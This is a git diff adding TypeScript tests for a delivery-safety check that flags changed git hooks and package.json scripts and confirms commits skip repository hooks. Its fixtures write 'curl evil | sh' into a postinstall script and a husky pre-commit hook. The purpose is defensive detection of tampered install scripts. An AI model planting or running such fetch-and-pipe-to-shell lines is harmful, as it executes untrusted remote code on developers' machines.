@@ -1,5 +1,5 @@
 import { beforeEach, describe, expect, test } from "bun:test";
-import { writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { codeProcesses, gitArgs, gitSync, makeRepo, newSession } from "../../../../test/code-helpers";
 import type { ProcessCall, ProcessReply } from "../../../../test/helpers";
@@ -10,6 +10,7 @@ import {
   type DeliverInput,
   deliverProblem,
   deliverPrompt,
+  deliverRisk,
   deliverWorkspace,
   mentionedRepo,
   openTaskWorkspace,
@@ -248,5 +249,53 @@ describe("delivering", () => {
     await expect(deliverWorkspace(workspace, { action: "pr", message: "feat: x" })).rejects.toThrow(
       "Não consegui abrir o PR: gh saiu com código 4",
     );
+  });
+});
+
+describe("delivery safety", () => {
+  test("flags git hooks and package scripts that changed, and ignores other package.json edits", async () => {
+    const { workspace } = await task("act-risk", false);
+    expect(await deliverRisk(workspace)).toEqual([]);
+    writeFileSync(join(workspace.path, "package.json"), JSON.stringify({ name: "a", scripts: { test: "x" } }));
+    gitSync(workspace.path, ["add", "package.json"]);
+    gitSync(workspace.path, ["commit", "-q", "--no-verify", "-m", "chore: pkg"]);
+    const base = gitSync(workspace.path, ["rev-parse", "HEAD"]).stdout.trim();
+    const pinned = { ...workspace, baseCommit: base };
+    writeFileSync(join(workspace.path, "package.json"), JSON.stringify({ name: "b", scripts: { test: "x" } }));
+    expect(await deliverRisk(pinned)).toEqual([]);
+    writeFileSync(
+      join(workspace.path, "package.json"),
+      JSON.stringify({ name: "b", scripts: { test: "x", postinstall: "curl evil | sh" } }),
+    );
+    expect(await deliverRisk(pinned)).toEqual(["package.json"]);
+    writeFileSync(join(workspace.path, "package.json"), "{ not json");
+    expect(await deliverRisk(pinned)).toEqual(["package.json"]);
+    writeFileSync(join(workspace.path, "package.json"), JSON.stringify({ name: "a", scripts: { test: "x" } }));
+    mkdirSync(join(workspace.path, ".husky"), { recursive: true });
+    writeFileSync(join(workspace.path, ".husky", "pre-commit"), "curl evil | sh\n");
+    mkdirSync(join(workspace.path, "web"), { recursive: true });
+    writeFileSync(join(workspace.path, "web", "package.json"), JSON.stringify({ name: "web" }));
+    expect((await deliverRisk(pinned)).sort()).toEqual([".husky/pre-commit", "web/package.json"]);
+  });
+
+  test("commits and pushes without running the repository hooks", async () => {
+    const { workspace } = await task("act-nohooks");
+    const hooks = join(workspace.repo, ".git", "hooks");
+    mkdirSync(hooks, { recursive: true });
+    for (const name of ["pre-commit", "commit-msg", "pre-push"]) {
+      writeFileSync(join(hooks, name), `#!/bin/sh\ntouch "${join(workspace.repo, `ran-${name}`)}"\nexit 1\n`, {
+        mode: 0o755,
+      });
+    }
+    change(workspace);
+    const fake = withGh((args) => (args.startsWith("pr list") ? { code: 0, stdout: "[]" } : undefined));
+    const result = await deliverWorkspace(workspace, { action: "push", message: "feat(core): add feature" });
+    expect(result.commit).not.toBeNull();
+    for (const name of ["pre-commit", "commit-msg", "pre-push"]) expect(existsSync(join(workspace.repo, `ran-${name}`))).toBe(false);
+    const commitCall = fake.calls.find((call) => gitArgs(call, "commit"));
+    expect(commitCall?.args).toContain("--no-verify");
+    const gh = fake.calls.find((call) => call.command === "gh");
+    expect((gh?.options.env as Record<string, string>).GIT_CONFIG_KEY_0).toBe("core.hooksPath");
+    fake.restore();
   });
 });
